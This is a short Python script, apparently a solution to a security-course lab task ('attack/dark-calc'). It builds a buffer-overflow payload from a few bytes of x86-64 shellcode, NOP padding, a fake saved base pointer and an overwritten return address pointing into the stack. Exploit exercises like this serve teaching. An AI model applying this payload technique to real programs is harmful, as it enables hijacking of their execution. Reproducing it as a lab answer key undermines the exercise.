#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
from struct import pack

shellcode = bytes.fromhex("6a 04 5f 68 87 1a 40 00 c3")
shellcode = shellcode.ljust(16, b"\x90")
fake_rbp = b"B" * 8
stack_buffer = pack("<Q", 0x721000800FD0)
payload = shellcode + fake_rbp + stack_buffer

sys.stdout.buffer.write(payload)
